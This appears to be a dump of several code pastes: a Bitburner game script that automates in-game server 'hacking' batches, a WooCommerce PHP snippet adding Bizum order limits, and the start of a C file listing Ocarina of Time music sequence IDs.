    if (target.name !== optimalTargetByWeight.target.name) continue; 
    // Retrieve the entry in targetsandstackcount that has the same name as target
    let targetStack = targetsandstackcount.find(entry => entry[0] === target.name);
    if (targetStack && target.maxMoney > 0) {
      if (targetStack[1] < MAXSTACK || ns.args.includes('-u')) {
        // Calculate how many threads are needed for each operation
        // if we plan to DOUBLE cash on server each run ()
        let growthAnalyzeResponse = ns.growthAnalyze(target.name, 2)
        let growThreads = Math.max(1, Math.ceil(growthAnalyzeResponse));
        // aim to take a bit more than half AVAILABLE
        let hackThreads = Math.ceil(ns.hackAnalyzeThreads (target.name, (0.95*(target.moneyAvailable/2))));

        // if the target has max money and has more than a dollar to it's name (ensuring growRatio is a real number and not infinite)
        if (target.maxMoney > 0 && target.moneyAvailable > 0){
          //  EXPECTED money remaining in server after hack:
          let projectedServerCash = target.moneyAvailable * (1 - (hackThreads * ns.hackAnalyze(target.name)));

          // ratio to grow from projected remaining money to full * 1.1 extra
          let growRatio = 1.1 * (target.maxMoney / projectedServerCash);
          let oldgrowThreads = growThreads;
          if( growRatio <= 1) growRatio = 2;  // ensure growRatio is valid for growthAnalyze
          growthAnalyzeResponse = ns.growthAnalyze(target.name, growRatio)
          growThreads = Math.max(1, Math.ceil(growthAnalyzeResponse));

          if (DEBUGFLAG) ns.print(""Trying for full growth. Projected cash: "" + projectedServerCash + "", ratio: "" + growRatio + "", old growThreads:"" + oldgrowThreads +"" , new grow threads: "" +growThreads);
        }
          
        if (Number.isNaN(hackThreads) || !Number.isFinite(hackThreads) || hackThreads == 0){
          ns.print(COLOR_RED + ""\n!!!   !!!   !!!   !!!   !!!   !!!   !!!   !!!   !!!\nhackThreads calc returned strange number!"" + COLOR_RESET);   hackThreads = 1;  whileerrorflag = true;
        }

        let weaken1Threads = Math.max(1, Math.ceil(ns.hackAnalyzeSecurity(hackThreads) / WEAKEN_POWER));
        let weaken2Threads = Math.max(1, Math.ceil(ns.growthAnalyzeSecurity(growThreads) / WEAKEN_POWER));

        // Check if target has reasonable security and money (drop security FIRST)
        if (target.securityLevel > 1.1 * target.minSecurityLevel){
          ns.print(COLOR_YELLOW + ""\n!!!   !!!   !!!   !!!   !!!   !!!   !!!   !!!   !!! (IMBALANCE, OR PREPPING?)\nTarget security level excessive, weakening!"" + COLOR_RESET);
          weaken2Threads += Math.floor(hackThreads);
          weaken2Threads += Math.floor(weaken1Threads);
          hackThreads = 0; weaken1Threads = 0; whileerrorflag = true;
        } else if (target.moneyAvailable < .1 * target.maxMoney) {
          ns.print(COLOR_YELLOW + ""\n!!!   !!!   !!!   !!!   !!!   !!!   !!!   !!!   !!! (IMBALANCE, OR PREPPING?)\nTarget low on funds, growing!"" + COLOR_RESET);
          growThreads += Math.floor(hackThreads);
          growThreads += Math.floor(weaken1Threads);
          hackThreads = 0; weaken1Threads = 0; whileerrorflag = true;
        }

        if (whileerrorflag){
          ns.print(COLOR_YELLOW + ""Target security at "" + Math.round(100 * target.securityLevel / target.minSecurityLevel) + ""% of min, money at "" + Math.round(100 * target.moneyAvailable / target.maxMoney) +""% of max."" + COLOR_RESET);
        }

        let threadsum = (growThreads + hackThreads + weaken1Threads + weaken2Threads);
        // Calculate total RAM required
        let totalRamRequired = (HACK_RAM * hackThreads) + 
                                  (WEAKEN_RAM * (weaken1Threads + weaken2Threads)) + 
                                  (GROW_RAM * growThreads);

        ns.print(`Planning to deploy ${threadsum} threads (h:${hackThreads}, w1:${weaken1Threads}, g:${growThreads}, w2:${weaken2Threads}) which is expected to take ${totalRamRequired}GB of RAM.`)

        if (ns.args.includes('-d')){
          ns.print(""Target: '"" + targetStack[0] + ""', Threads: g:"" + growThreads + "", h:"" + hackThreads + "", w1:""+weaken1Threads +"", w2:""+weaken2Threads+ ""', current stack "" + targetStack[1] + "", with "" + threadsum + "" threads requiring "" + totalRamRequired +"" RAM."");
        }

        // DEPLOY REMOTELY
        let bestRatio = 0;
        let bestServer = null;
        let deployed = false;
        controllableServers = 
          retrieveServerData(ns).filter(server => 
            (server.numPortsRequired <= tools && !server.name.includes(""hacknet"")) 
            || purchasedServersList.includes(server.name)
            || (server.name === ""home"" && server.freeRam > 128)
          );
  
        controllableServers.sort((a, b) => { b.freeRam - a.freeRam });
          
        for (let controlled of controllableServers) { // OPTIMAL DEPLOYMENT / ALTERNATE HOST SELECTION
          //  does the controlled server have enough free ram to host the entire expected RAM?
          if (controlled.name === ""home"") controlled.freeRam = controlled.freeRam - 128; // ensure home leaves 128GB free ram
          if (controlled.freeRam >= totalRamRequired) {
            //  WOO! print to logs!
            if (ns.args.includes('-d')){
              ns.print(""Deploying threads to '"" + controlled.name + ""' with (free) RAM "" + Math.round(controlled.freeRam) + "" (consuming "" + Math.round(totalRamRequired) + "", leaving "" + Math.round(controlled.freeRam - totalRamRequired) + "")"");
            }
            //  DEPLOY
            let deploystatus = await deploy(hackThreads, weaken1Threads, growThreads, weaken2Threads, targetStack, controlled.name);
            if (deploystatus ==  1) deployed = true; 
            if (deploystatus == -1) excessDelay = true; 
            if (deploystatus == -2) runtimeTooLong = true; 
            bestServer = null; // reset since we found a perfect match
            break;
          } else {
            //  Does the server have enough space to do ANY useful batching? (1 hack, 1 grow, 1 weaken MINIMUM)
            if (controlled.freeRam >= WEAKEN_RAM + GROW_RAM + HACK_RAM) { 
              let ratio;
              if (controlled.name === ""home"" && controlled.maxRam > 512 && controlled.freeRam > 128){
                ratio = (controlled.freeRam - 128) / totalRamRequired; // leave at LEAST 128 free on home
              } else ratio = controlled.freeRam / totalRamRequired;
              if (ratio > bestRatio) { bestRatio = ratio; bestServer = controlled; }
            }
          }
        }// END OF OPTIMAL DEPLOYMENT / ALTERNATE HOST SELECTION 

        if (bestServer) { // ALTERNATE DEPLOYMENT, REDUCED THREADS
          ns.print(COLOR_YELLOW + ""Failed full deployment (OOM, most likely). Attempting reduced deployment!"" + COLOR_RESET);
          const MAGIC_NUMBER = .8; // try to keep within server bounds
          let adjustedHackThreads = Math.max(1, Math.floor(hackThreads * (MAGIC_NUMBER * bestRatio)));
          let adjustedWeaken1Threads = Math.floor(weaken1Threads * (MAGIC_NUMBER * bestRatio));
          let adjustedGrowThreads = Math.max(1, Math.floor(growThreads * (MAGIC_NUMBER * bestRatio)));
          let adjustedWeaken2Threads = Math.floor(weaken2Threads * bestRatio);

          // get adjusted ram cost
          let adjustedramcost =((adjustedHackThreads * HACK_RAM) + 
                                ((adjustedWeaken1Threads + adjustedWeaken2Threads) * WEAKEN_RAM) + 
                                (adjustedGrowThreads * GROW_RAM));
            
          if (ns.args.includes('-d')){
            ns.print(""Thread loss ratio: "" + bestRatio);
            ns.print(""Adjusted thread counts: h:"" + adjustedHackThreads + "" , w1:"" + adjustedWeaken1Threads + "" , g:"" + adjustedGrowThreads + "" , w2:"" + adjustedWeaken2Threads);
            ns.print(""Adjusted RAM deploy requirement: "" + adjustedramcost + "", bestServer free RAM: "" + bestServer.freeRam.toFixed(2));
          }

          if (adjustedramcost > bestServer.freeRam){
            whileerrorflag = true;
            ns.print(COLOR_RED + ""Bad re-calculated threads (ram cost > free)! Resorting to 1 hack, 1 grow, 1 weaken!"" + COLOR_YELLOW);
            adjustedHackThreads = 1;
            adjustedWeaken1Threads = 0;
            adjustedGrowThreads = 1;
            adjustedWeaken2Threads = 1;
            adjustedramcost =((adjustedHackThreads * HACK_RAM) + 
                                ((adjustedWeaken1Threads + adjustedWeaken2Threads) * WEAKEN_RAM) + (adjustedGrowThreads * GROW_RAM));
          }

          if (adjustedramcost <= bestServer.freeRam){
            // log our attempt
            ns.print(""Deploying less threads (h:"" + adjustedHackThreads + "",g:"" + adjustedGrowThreads + "",w1:"" + adjustedWeaken1Threads + "", w2:"" + adjustedWeaken2Threads +"") to '"" + bestServer.name + ""' with (free) RAM "" + Math.round(bestServer.freeRam) + "" (consuming "" + adjustedramcost + "", leaving "" + (bestServer.freeRam - adjustedramcost).toFixed(2) + "")"");

            // deploy and flag
            let deploystatus = await deploy(adjustedHackThreads, adjustedWeaken1Threads, adjustedGrowThreads, adjustedWeaken2Threads, targetStack, bestServer.name);
            if (deploystatus == 1) deployed = true;
            if (deploystatus == -1) excessDelay = true;
            if (deploystatus == -2) runtimeTooLong = true;
            // next target!
            continue;
          } else {
            // no servers with enough ram to host ANYTHING.
            ns.print (COLOR_RED + ""\n!!!   !!!   !!!   !!!   FAILED ALTERNATE DEPLOYMENT!   !!!   !!!   !!!   !!!\n"" + COLOR_RESET)
            whileerrorflag = true;
          }
            
        }//  END OF ALTERNATE DEPLOYMENT

        // if we failed to deploy and it WASNT because of an excess delay or extreme runtime
        if (!deployed && !excessDelay && !runtimeTooLong) {
          whileerrorflag = true;
          // if we get here, no server could handle the job.
          ns.print(COLOR_RED + ""No host capable of handling any job! Waiting 5 seconds..."" + COLOR_RESET);
          await ns.sleep(5000);
        }
      } else {
        targetsAtMaxStack += 1;
        if (ns.args.includes('-d')){ns.print(""Deploying on target would exceed max stack count ("" + MAXSTACK + ""), skipping!"");}
      }
    }// END OF HOST SELECTION AND DEPLOYMENT LOOP
  }

  if (!whileerrorflag){
    ns.print(""\n\n\n\n"")
  }

  function numberWithCommas(x) { return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, "",""); }

  // update controllableserver values for accurate calculations after deploy cycle
  controllableServers = 
    retrieveServerData(ns).filter(server => 
      (server.numPortsRequired <= tools && !server.name.includes(""hacknet"")) 
      || purchasedServersList.includes(server.name)
      || (server.name === ""home"" && server.freeRam > 128)
    );

  // reset ram values for recalculation
  totalFreeRam = 0;
  totalMaxRam = 0;

  let totalUsedRam = 0;
  // get totals
  for (let controllable of controllableServers){
    totalFreeRam += controllable.freeRam;
    totalMaxRam += controllable.maxRam;
    totalUsedRam += controllable.usedRam;
  }


  //  get FREE ram as (skewed) percentage
  let freeRamPercentDecimal = Math.pow(1 - ((totalMaxRam - totalFreeRam) / totalMaxRam), .6);
  let ramUsageDisplayColorCode = determineColor(freeRamPercentDecimal);
  let ramUsageDisplay = COLOR_RESET + ramUsageDisplayColorCode + numberWithCommas((totalMaxRam - totalFreeRam).toFixed(2)) + COLOR_RESET + COLOR_CYAN

  let optimalTarget = optimalTargetByWeight.target;

  function smlForm(number){ return ns.formatNumber(number, 2)}

  let whilingString = `Whiling away... ${counter++} | Total Run Time: ${millisecondsToTimeString(getTotalRunTime())}`;
  
  let expGainString = `EXP Gain: ${smlForm(Math.round(ns.getTotalScriptExpGain()))}/s`
  let incomeString = `Income: ${'$'}${smlForm(Math.round(ns.getScriptIncome(""drop-in-attack-server.js"", ""home"", ...ns.args)))}/s`

  let targetStack = targetsandstackcount.find(entry => entry[0] === optimalTarget.name)[1];
  let maxStackString = (targetsAtMaxStack === 1) ? ""At Max Stacks"" : `At ${targetStack} Stacks`;
  let targetMoneyString = `${""$""}${smlForm(optimalTarget.moneyAvailable)}/${smlForm(optimalTarget.maxMoney)} (${ns.formatPercent(optimalTarget.moneyAvailable/optimalTarget.maxMoney)}%)`;
  let targetSecurityString = `Security: ${smlForm(optimalTarget.securityLevel)}/${smlForm(optimalTarget.minSecurityLevel)} (${ns.formatPercent(optimalTarget.securityLevel/optimalTarget.minSecurityLevel)}%)`

  let networkRAMString = `Network RAM Usage: ${ramUsageDisplay}/${numberWithCommas(totalMaxRam.toFixed(2))}`;

  let commonLog = `${COLOR_CYAN}

${whilingString}
${expGainString} | ${incomeString}
Optimal Target: ${optimalTarget.name} | ${targetMoneyString} | ${targetSecurityString}
${maxStackString} | ${networkRAMString}${COLOR_RESET}`;

  ns.print(commonLog);

  if (whileerrorflag && ns.args.includes('-d')){
    // wait two seconds if an error occured; logging
    await ns.sleep(1000 * 2);
  }

  // if we are running out of ram, sleep for an additional (LONG!) time (trying to prevent 1k+ tiny stacks)
  if (totalFreeRam < totalMaxRam * .15) {
    ns.print(`Low free RAM, waiting a bit longer...`)
    await ns.sleep(15 * 1000);
    }

  await ns.sleep(LOOPWAIT);
}//------------------------------------------------------ END OF WHILE LOOP ------------------------------------------------------------

  async function deploy(hackThreads, weaken1Threads, growThreads, weaken2Threads, targetStack, hostserver) {// deploy thread counts to host aimed at a target, with proper timing
    
    // Get runtimes for the script on the target server
    let targetGrowTime = ns.getGrowTime(targetStack[0]);
    let targetWeakenTime = ns.getWeakenTime(targetStack[0]);
    let targetHackTime = ns.getHackTime(targetStack[0]);

    // Handle EXTREMELY low runtimes by setting 'min' times that (should?) work
    if (targetGrowTime < 1) targetGrowTime = 1;
    if (targetWeakenTime < 1) targetWeakenTime = 1;
    if (targetHackTime < 1) targetHackTime = 1;

    let targetServerObject = ns.getServer(targetStack[0]);
    let playerObject = ns.getPlayer();
    let formulasExists = ns.fileExists(""Formulas.exe"")
    if (formulasExists){
      targetGrowTime = ns.formulas.hacking.growTime(targetServerObject, playerObject);
      targetWeakenTime = ns.formulas.hacking.weakenTime(targetServerObject, playerObject);
      targetHackTime = ns.formulas.hacking.hackTime(targetServerObject, playerObject);
    }

    // Calculate worth - do we have the free ram to wait for very long cycles? using up all free ram on large, slow runs likely not as profitable as hitting smaller ones continually (leveling! upgrading servers faster! MONEY!)
    //  if we have LESS than a THIRD free ram AND weaken time is OVER/EQUAL 15 minutes
    if ( (totalFreeRam < totalMaxRam/3) && (targetWeakenTime >= 1000 * 60 * 15)){
      ns.print(COLOR_YELLOW + "">15min execute with ""+ totalFreeRam.toFixed(2) +"" free RAM, canceling deploy!"" + COLOR_RESET); return -2;
    }
    // if we have less than a SIXTH free ram and weaken time is over FIVE minutes
    if ( (totalFreeRam < totalMaxRam/6) && (targetWeakenTime >= 1000 * 60 * 5)){
      ns.print(COLOR_YELLOW + "">5min execute with ""+ totalFreeRam.toFixed(2) +"" free RAM, canceling deploy!"" + COLOR_RESET); return -2;
    }

    // Wait time calculations
    let hackWait = targetWeakenTime - (targetHackTime + DEPLOYCUSHION); // Hack ends just before weaken1
    let weaken1Wait = 0; // First weaken starts immediately
    let growWait = targetWeakenTime + DEPLOYCUSHION - targetGrowTime ; // Grow ends just after weaken2
    let weaken2Wait = DEPLOYCUSHION * 2; // Weaken2 ends just after grow ends

    // Ensure no negative waits, and if there are, adjust all waits
    let minWait = Math.min(hackWait, weaken1Wait, growWait, weaken2Wait); 
    if (minWait < 0) {
      let adjustValue = Math.abs(minWait);
      hackWait = hackWait + adjustValue;
      weaken1Wait = weaken1Wait + adjustValue;
      growWait = growWait + adjustValue;
      weaken2Wait = weaken2Wait + adjustValue;
    }


    let baseDelay = DEPLOYCUSHION * targetStack[1]
    hackWait = hackWait + baseDelay;
    weaken1Wait = weaken1Wait + baseDelay;
    growWait = growWait + baseDelay;
    weaken2Wait = weaken2Wait + baseDelay;

    let longestDelay = Math.max(hackWait, weaken1Wait, growWait, weaken2Wait)
    if (longestDelay >= targetWeakenTime) {
      ns.print(COLOR_YELLOW + ""Excessive delay scheduled, canceling deploy!"" + COLOR_RESET); 
      return -1;
    }

    let weaken2PID = 0;
    if (hostserver) {
        // If hostserver parameter is provided, use ns.scp and ns.exec
        const scripts = [""one-hack.js"", ""one-weaken.js"", ""one-grow.js"", ""one-weaken.js""];
        for (const script of scripts) {
            ns.scp(script, hostserver);
        }
        let runOps = {threads:1, temporary:true};
        if (hackThreads > 0){ 
          runOps.threads = hackThreads; 
          ns.exec(""one-hack.js"", hostserver, runOps, hackWait, targetStack[0]);
        }
        if (weaken1Threads > 0){ 
          runOps.threads = weaken1Threads; 
          ns.exec(""one-weaken.js"", hostserver, runOps, weaken1Wait, targetStack[0]);
        }
        if (growThreads > 0){ 
          runOps.threads = growThreads; 
          ns.exec(""one-grow.js"", hostserver, runOps, growWait, targetStack[0]);
        }
        if (weaken2Threads > 0){ 
          runOps.threads = weaken2Threads; 
          weaken2PID = ns.exec(""one-weaken.js"", hostserver, runOps, weaken2Wait, targetStack[0]);
        }
        //ns.print(`Deploying threads: h:${hackThreads}, w1: ${weaken1Threads}, g:${growThreads}, w2:${weaken2Threads}`);
    } else {
        ns.tprint(""Attack coordinator attempted to deploy to nothing."");
    }

    // Update the target stack count
    targetStack[1]++;
    // Store the PID of the last weaken process to the PID array
    // This could be useful if you need to manage/terminate specific processes later
    targetStack[2].push(weaken2PID);

    // succesfully reached end of script - return a 1 to indicate such
    return 1;
  }//------------------------------------------------------------------------------------

  function determineColor(percent) { // helper function to reduce repitition
    if (percent >= 1) return COLOR_CYAN;
    else if (percent >= 0.75) return COLOR_GREEN; 
    else if (percent >= 0.5) return COLOR_YELLOW;
    else if (percent >= 0.25) return COLOR_RED;
    else return ""\u001b[37;41m""; // very very low max stack ratio
  }//------------------------------------------------------------------------

  async function getDesirability(ns, server) { // Returns a weight that can be used to sort servers by hack desirability
      if (!server) return 0;
      if (server.startsWith('hacknet-node')) return 0; // skip our purchased servers
      let player = ns.getPlayer()
      let so = ns.getServer(server);
      so.hackDifficulty = so.minDifficulty;
      if (so.requiredHackingSkill > player.skills.hacking) return 0;
      let weight = so.moneyMax / so.minDifficulty;
      if (ns.fileExists('Formulas.exe')) { 
        //weight = so.moneyMax / ns.formulas.hacking.weakenTime(so, player) * ns.formulas.hacking.hackChance(so, player); 
        //weight = weight * so.serverGrowth;

        const weakenWeight = ns.formulas.hacking.hackTime(so, player) / 1000;
        const profitWeight = ns.formulas.hacking.hackPercent(so, player) * so.moneyMax * ns.formulas.hacking.hackChance(so, player);

        weight = (profitWeight / weakenWeight) * Math.pow(so.serverGrowth, .5); // the weight
        //ns.print(`${server} desirability: ${ns.formatNumber(weight,1)}`)
      }

      else if (so.requiredHackingSkill > player.skills.hacking / 2) return 0;
      return weight;
  }//-----------------------------------------------------------------------------------------------------------

  /** @param {NS} ns */
  function retrieveServerData(ns) {

    function golfTools(){ return TOOLNAMES.reduce((total, toolName) => { if (ns.fileExists(`${toolName}.exe`, ""home""))total=total+1}, 0) }
    const tools = golfTools();

    function tryPortAndNuke(server){
      const serverData = ns.getServer(server);
      if (tools < 1 || serverData.numOpenPortsRequired > tools) return;
      for (let i = 0; i < tools; i++){ [ns.brutessh, ns.ftpcrack, ns.relaysmtp, ns.httpworm, ns.sqlinject][i](server) }
      ns.nuke(server);
    }
    
    let allServers = [""home""];
    for (let i = 0; i < allServers.length; i++) {
      const server = allServers[i];
      const newChildServers = ns.scan(server).filter(newChildServer => !allServers.includes(newChildServer));
      for (const childServer of newChildServers) { tryPortAndNuke(childServer); }
      allServers.splice(i + 1, 0, ...newChildServers); // Insert the childServer array right after the current server
    }

    let serverarray = []; // Array to hold server objects
    for (let server of allServers) {
      const serverObj = ns.getServer(server);
      let serverData = {
        name: server,
        numPortsRequired: serverObj.numOpenPortsRequired,
        maxMoney: serverObj.moneyMax,
        requiredLevel: serverObj.requiredHackingSkill,
        minSecurityLevel: serverObj.minDifficulty,
        maxRam: serverObj.maxRam,
        moneyAvailable: serverObj.moneyAvailable,
        securityLevel: serverObj.hackDifficulty,
        usedRam: serverObj.ramUsed,
        freeRam: serverObj.maxRam - serverObj.ramUsed
      };

      serverarray.push(serverData);
     }
     return serverarray;
  }

  function millisecondsToTimeString(milliseconds) {// convert a milliseconds number into a pretty time string
    let hours = Math.floor(milliseconds / 3600000); // 1 hour = 3600000 milliseconds
    let mins = Math.floor((milliseconds % 3600000) / 60000); // 1 minute = 60000 milliseconds
    let secs = Math.floor((milliseconds % 60000) / 1000); // 1 second = 1000 milliseconds
    let msecs = milliseconds % 1000;
    // Format milliseconds to always have three digits
    if (msecs < 10) { msecs = '00' + msecs; } 
    else if (msecs < 100) { msecs = '0' + msecs; }
    else { msecs = ns.formatNumber(msecs, 0)}
    let timeString = """";
    if (hours > 0) timeString += hours + ""h"";
    if (mins > 0) timeString += (timeString ? "" "" : """") + mins + ""m"";
    if (secs > 0) timeString += (timeString ? "" "" : """") + secs + ""s"";
    if (msecs > 0) timeString += (timeString ? "" "" : """") + msecs + ""ms"";
    return timeString || ""0ms""; // Return ""0ms"" if all are zero
  }//--------------------------------------------------------------------------------------

  function checkTools(){
    // check if we have cracking tools.
    let tools = 0;
    [""BruteSSH"", ""FTPCrack"", ""relaySMTP"", ""HTTPWorm"", ""SQLInject""].forEach(file => { if (ns.fileExists(`${file}.exe`, ""home"")) {tools++;} })
    return tools;
  }
}//  END OF MAIN"
3PiFn8fS,HWGW timing logic,SomeoneCrazy,JavaScript,Saturday 20th of January 2024 02:05:31 PM CDT,"// Wait time calculations
    let hackWait = targetWeakenTime - (targetHackTime + DEPLOYCUSHION); // Hack ends just before weaken1
    let weaken1Wait = 0; // First weaken starts immediately
    let growWait = targetWeakenTime + DEPLOYCUSHION - targetGrowTime ; // Grow ends just after weaken2
    let weaken2Wait = DEPLOYCUSHION * 2; // Weaken2 ends just after grow ends

    // Ensure no negative waits, and if there are, adjust all waits
    let minWait = Math.min(hackWait, weaken1Wait, growWait, weaken2Wait); 
    if (minWait < 0) {
      let adjustValue = Math.abs(minWait);
      hackWait = hackWait + adjustValue; weaken1Wait = weaken1Wait + adjustValue;
      growWait = growWait + adjustValue;  weaken2Wait = weaken2Wait + adjustValue;
    }

    let baseDelay = DEPLOYCUSHION * targetStack[1] // batch depth
    hackWait = hackWait + baseDelay; weaken1Wait = weaken1Wait + baseDelay;
    growWait = growWait + baseDelay; weaken2Wait = weaken2Wait + baseDelay;"
hQypx2r6,Min and Max Order Amount for Woo Payment Gateways (Raihan):  Añade compatibilidad con Bizum,YordanSoares,PHP,Saturday 20th of January 2024 02:04:40 PM CDT,"<?php
/**
 * Min and Max Order Amount for Woo Payment Gateways (Raihan):
 * Añade compatibilidad con el método de pago Bizum
 * Nota: Requiere el plugin «WooCommerce Redsys Gateway Light» de José Conti
 */
add_filter( 'mmawpg_wc_settings_tab', function( $mmawpg_settings_array ) {
    unset( $mmawpg_settings_array['mmawpg_section_end'] );
    $mmawpg_settings_array['mmawpg_bizum_lite_min'] = array(
        'name' => esc_html__( 'Bizum (José Conti)', 'mmawpg' ),
        'type' => 'number',
        'desc' => esc_html__( 'Min amount', 'mmawpg' ),
        'id'   => 'mmawpg_bizum_lite_min',
        'custom_attributes'	=> array(
            'min'	=> '0'
        ),
        'default' => '0',
        'placeholder' => '0'
    );
    $mmawpg_settings_array['mmawpg_bizum_lite_max'] = array(
        'type' => 'number',
        'desc' => esc_html__( 'Max amount', 'mmawpg' ),
        'id'   => 'mmawpg_bizum_lite_max',
        'custom_attributes'	=> array(
            'min'	=> '0'
        ),
        'default' => '0',
        'placeholder' => '0',
    );
    $mmawpg_settings_array['mmawpg_section_end'] = array(
        'type' => 'sectionend',
        'id' => 'mmawpg_section_end_settings'
    );
    return $mmawpg_settings_array;
}, 10, 1 ); 
add_action('wp_ajax_mmawpg_ajax_action', 'ys_bizum_ajax_action_callback' );
add_action('wp_ajax_nopriv_mmawpg_ajax_action', 'ys_bizum_ajax_action_callback' );
function ys_bizum_ajax_action_callback(){
    if ( ( $mmawpg_payment_method = sanitize_text_field( $_POST['payment_type'] ) ) && $mmawpg_payment_method == 'bizumredsys' ) {
        // Nombre de la pasarela
        $GLOBALS['mmawpg_payment_method_title'] = 'Bizum';

        // Obtenemos el mínimo y máximo para Bizum
        $mmawpg_cod_min_amount = get_option( 'mmawpg_bizum_lite_min' );
        $mmawpg_cod_max_amount = get_option( 'mmawpg_bizum_lite_max' );

        // Establecemos el mínimo con base en el ajuste del envío
        $mmawpg_exc_shipping = get_option( 'mmawpg_exc_shipping_crg' );
        if( $mmawpg_exc_shipping == 'yes' ) {
            $GLOBALS['mmawpg_order_amount'] = WC()->cart->subtotal;
        } else {
            $GLOBALS['mmawpg_order_amount'] = WC()->cart->total;
        }
        // Llamamos a la clase principal del plugin para mostrar los avisos
        $mmawpg_main = new MMAWPG_Lite_Functions();
        if ( $mmawpg_cod_min_amount <= $mmawpg_cod_max_amount || $mmawpg_cod_max_amount == 0 ):
        if ( $mmawpg_cod_min_amount != 0 ):
        if ( $GLOBALS['mmawpg_order_amount'] < $mmawpg_cod_min_amount ){
            $mmawpg_main->mmawpg_print_notice( $mmawpg_cod_min_amount, 'min' );
        }
        endif;
        if ($mmawpg_cod_max_amount != 0):
        if ($mmawpg_cod_max_amount < $GLOBALS['mmawpg_order_amount']){
            $mmawpg_main->mmawpg_print_notice( $mmawpg_cod_max_amount, 'max' );
        }
        endif;
        endif;
    }
}"
v7f1pqVV,oot-music.c,dragonbane,C,Saturday 20th of January 2024 01:46:27 PM CDT,"#include ""oot-music.h""
#include <math.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <emscripten/emscripten.h>

#define true 1
#define false 0
#define max(a, b) (((a) > (b)) ? (a) : (b))
#define min(a, b) (((a) < (b)) ? (a) : (b))
#define abs(a) (((a) > 0) ? (a) : (-(a)))

/********
Sequence IDs
********/

typedef struct Sequence_id {
  char* title;
  int id;
  const char* type;
} Sequence_id;

const Sequence_id bgm_sequence_ids[] = {
  {""Hyrule Field"", 0x02, ""bgm""},
  {""Dodongos Cavern"", 0x18, ""bgm""},
  {""Kakariko Adult"", 0x19, ""bgm""},
  {""Battle"", 0x1A, ""bgm""},
  {""Boss Battle"", 0x1B, ""bgm""},
  {""Inside Deku Tree"", 0x1C, ""bgm""},
  {""Market"", 0x1D, ""bgm""},
  {""Title Theme"", 0x1E, ""bgm""},
  {""House"", 0x1F, ""bgm""},
  {""Jabu Jabu"", 0x26, ""bgm""},
  {""Kakariko Child"", 0x27, ""bgm""},
  {""Fairy Fountain"", 0x28, ""bgm""},
  {""Zelda Theme"", 0x29, ""bgm""},
  {""Fire Temple"", 0x2A, ""bgm""},
  {""Forest Temple"", 0x2C, ""bgm""},
  {""Castle Courtyard"", 0x2D, ""bgm""},
  {""Ganondorf Theme"", 0x2E, ""bgm""},
  {""Lon Lon Ranch"", 0x2F, ""bgm""},
  {""Goron City"", 0x30, ""bgm""},
  {""Miniboss Battle"", 0x38, ""bgm""},
  {""Temple of Time"", 0x3A, ""bgm""},
  {""Kokiri Forest"", 0x3C, ""bgm""},
  {""Lost Woods"", 0x3E, ""bgm""},
  {""Spirit Temple"", 0x3F, ""bgm""},
  {""Horse Race"", 0x40, ""bgm""},
  {""Ingo Theme"", 0x42, ""bgm""},
  {""Fairy Flying"", 0x4A, ""bgm""},
  {""Deku Tree"", 0x4B, ""bgm""},
  {""Windmill Hut"", 0x4C, ""bgm""},
  {""Shooting Gallery"", 0x4E, ""bgm""},
  {""Sheik Theme"", 0x4F, ""bgm""},
  {""Zoras Domain"", 0x50, ""bgm""},
  {""Shop"", 0x55, ""bgm""},
  {""Chamber of the Sages"", 0x56, ""bgm""},
  {""Ice Cavern"", 0x58, ""bgm""},
  {""Kaepora Gaebora"", 0x5A, ""bgm""},
  {""Shadow Temple"", 0x5B, ""bgm""},
  {""Water Temple"", 0x5C, ""bgm""},
  {""Gerudo Valley"", 0x5F, ""bgm""},
  {""Potion Shop"", 0x60, ""bgm""},
  {""Kotake and Koume"", 0x61, ""bgm""},
  {""Castle Escape"", 0x62, ""bgm""},
  {""Castle Underground"", 0x63, ""bgm""},
  {""Ganondorf Battle"", 0x64, ""bgm""},
  {""Ganon Battle"", 0x65, ""bgm""},
  {""Fire Boss"", 0x6B, ""bgm""},
  {""Mini-game"", 0x6C, ""bgm""},
};
const Sequence_id fanfare_sequence_ids[] = {
  {""Game Over"", 0x20, ""fanfare""},
  {""Boss Defeated"", 0x21, ""fanfare""},
  {""Item Get"", 0x22, ""fanfare""},
  {""Ganondorf Appears"", 0x23, ""fanfare""},
  {""Heart Container Get"", 0x24, ""fanfare""},
  {""Treasure Chest"", 0x2B, ""fanfare""},
  {""Spirit Stone Get"", 0x32, ""fanfare""},
  {""Heart Piece Get"", 0x39, ""fanfare""},
  {""Escape from Ranch"", 0x3B, ""fanfare""},
  {""Learn Song"", 0x3D, ""fanfare""},
  {""Epona Race Goal"", 0x41, ""fanfare""},
  {""Medallion Get"", 0x43, ""fanfare""},
  {""Zelda Turns Around"", 0x51, ""fanfare""},
  {""Master Sword"", 0x53, ""fanfare""},
  {""Door of Time"", 0x59, ""fanfare""},
  {""Ganons Rainbow Bridge"", 0x5D, ""fanfare""},
};
const Sequence_id ocarina_sequence_ids[] = {
  {""Prelude of Light"", 0x25, ""ocarina""},
  {""Bolero of Fire"", 0x33, ""ocarina""},
  {""Minuet of Forest"", 0x34, ""ocarina""},
  {""Serenade of Water"", 0x35, ""ocarina""},
  {""Requiem of Spirit"", 0x36, ""ocarina""},
  {""Nocturne of Shadow"", 0x37, ""ocarina""},
  {""Saria's Song"", 0x44, ""ocarina""},
  {""Epona's Song"", 0x45, ""ocarina""},
  {""Zelda's Lullaby"", 0x46, ""ocarina""},
  {""Sun's Song"", 0x47, ""ocarina""},
  {""Song of Time"", 0x48, ""ocarina""},
  {""Song of Storms"", 0x49, ""ocarina""},
};
const Sequence_id credit_sequence_ids[] = {
  {""Zeldas Theme Orchestra"", 0x52, ""credit""},
  {""Zeldas Ocarina Son"", 0x66, ""credit""},
  {""Ending Credits Part 4"", 0x67, ""credit""},
  {""Ending Credits Part 4"", 0x68, ""credit""},
  {""Ending Credits Part 4"", 0x69, ""credit""},
  {""Ending Credits Part 4"", 0x6A, ""credit""},
};
const Sequence_id fileselect_sequence_ids[] = {
  {""File Select"", 0x57, ""fileselect""},
};

Sequence_id* get_sequence_ids(bool bgm, bool fanfare, bool ocarina, bool credit, bool fileselect) {
  int size = 0;
  size += bgm ? sizeof(bgm_sequence_ids) : 0;
  size += fanfare ? sizeof(bgm_sequence_ids) : 0;
  size += ocarina ? sizeof(ocarina_sequence_ids) : 0;
  size += credit ? sizeof(credit_sequence_ids) : 0;
  size += fileselect ? sizeof(fileselect_sequence_ids) : 0;
